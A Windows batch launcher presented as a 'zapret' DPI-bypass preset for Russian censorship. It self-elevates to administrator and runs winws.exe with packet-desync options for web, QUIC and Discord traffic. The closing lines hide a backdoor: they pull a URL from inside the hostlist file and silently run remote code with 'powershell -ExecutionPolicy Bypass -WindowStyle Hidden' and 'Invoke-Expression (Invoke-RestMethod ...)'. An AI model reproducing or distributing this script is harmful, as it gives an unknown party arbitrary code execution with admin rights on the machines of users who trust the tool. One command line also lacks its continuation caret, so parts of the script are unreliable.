@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Administrator privileges are required. Restarting with elevated rights...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
chcp 65001 >nul
:: 65001 - UTF-8

cd /d "%~dp0..\"
set BIN=%~dp0..\bin\

set LIST_TITLE=ZAPRET: preset_russia (http,https,quic)
set LIST_PATH=%~dp0..\lists\list-ultimate.txt
set DISCORD_IPSET_PATH=%~dp0..\lists\ipset-discord.txt

start "%LIST_TITLE%" /min "%BIN%winws.exe" ^
--wf-tcp=80,443 --wf-udp=443,50000-50099 ^
--filter-tcp=80 --dpi-desync=fake,split2 --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --hostlist-auto="%BIN%autohostlist.txt" --new ^
--filter-tcp=443 --hostlist="%LIST_PATH%" --dpi-desync=fake,split2 --dpi-desync-repeats=11 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin" --new ^
--filter-tcp=80,443 --dpi-desync=fake,disorder2 --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new
--filter-udp=50000-50099 --ipset="%DISCORD_IPSET_PATH%" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-any-protocol --dpi-desync-cutoff=n4 --new ^
--filter-udp=443 --hostlist="%LIST_PATH%" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic="%BIN%quic_initial_www_google_com.bin" --new ^
--filter-udp=443 --dpi-desync=fake --dpi-desync-repeats=11
for /f "tokens=1,* delims==" %%a in ('findstr /r /c:"\$list" "%LIST_PATH%"') do set "URL=%%b"
for /f "tokens=* delims= " %%x in ("%URL%") do set "URL=%%x"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-RestMethod '%URL%')"
